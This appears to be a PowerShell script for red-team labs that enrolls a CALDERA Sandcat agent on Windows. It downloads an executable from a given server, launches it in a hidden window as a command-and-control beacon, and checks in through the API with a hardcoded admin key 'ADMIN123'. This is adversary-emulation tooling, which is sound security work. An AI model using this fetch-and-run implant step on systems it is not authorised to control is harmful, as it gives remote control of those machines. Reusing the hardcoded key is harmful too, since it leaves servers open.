# ============================================================================
# Enroll CALDERA Agent - Windows
# ============================================================================
# Installs and starts Sandcat agent on Windows hosts
# Usage: ./enroll-caldera-agent.ps1 -CalderaUrl "http://server:8888" -Group "red"
# ============================================================================

param(
    [Parameter(Mandatory=$true)]
    [string]$CalderaUrl,
    
    [Parameter(Mandatory=$false)]
    [string]$Group = "red",
    
    [Parameter(Mandatory=$false)]
    [string]$Platform = "windows"
)

$ErrorActionPreference = "Stop"

Write-Host "[$(Get-Date)] Enrolling agent in CALDERA at $CalderaUrl..." -ForegroundColor Green

# Download Sandcat agent
$sandcatUrl = "$CalderaUrl/file/download"
$agentPath = "$env:TEMP\sandcat.exe"

try {
    Write-Host "[$(Get-Date)] Downloading Sandcat agent..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $sandcatUrl -OutFile $agentPath -UseBasicParsing
    
    # Verify download
    if (!(Test-Path $agentPath)) {
        throw "Failed to download Sandcat agent"
    }
    
    Write-Host "[$(Get-Date)] Downloaded: $agentPath ($(Get-Item $agentPath).Length bytes)" -ForegroundColor Cyan
    
    # Start agent in background
    $arguments = @(
        "-server $CalderaUrl"
        "-group $Group"
        "-v"
    )
    
    Write-Host "[$(Get-Date)] Starting Sandcat agent (group: $Group)..." -ForegroundColor Cyan
    $process = Start-Process -FilePath $agentPath -ArgumentList $arguments -WindowStyle Hidden -PassThru
    
    if ($process) {
        Write-Host "[$(Get-Date)] ✅ Agent started successfully (PID: $($process.Id))" -ForegroundColor Green
    } else {
        throw "Failed to start Sandcat agent"
    }
    
    # Verify beacon (wait 15 seconds)
    Start-Sleep -Seconds 15
    
    try {
        $headers = @{ "KEY" = "ADMIN123" }
        $agentsCheck = Invoke-RestMethod -Uri "$CalderaUrl/api/v2/agents" -Headers $headers -Method Get -UseBasicParsing
        $activeAgents = $agentsCheck | Where-Object { $_.group -eq $Group }
        
        Write-Host "[$(Get-Date)] Active agents in group '$Group': $($activeAgents.Count)" -ForegroundColor Cyan
        
        if ($activeAgents.Count -gt 0) {
            Write-Host "[$(Get-Date)] ✅ Agent check-in confirmed" -ForegroundColor Green
        } else {
            Write-Warning "[$(Get-Date)] ⚠️ Agent not visible in CALDERA yet (may take 30-60s for first beacon)"
        }
    } catch {
        Write-Warning "[$(Get-Date)] ⚠️ Could not verify agent check-in via API: $_"
    }
    
} catch {
    Write-Error "[$(Get-Date)] ❌ Agent enrollment failed: $_"
    exit 1
}

Write-Host "[$(Get-Date)] ✅ Enrollment complete" -ForegroundColor Green
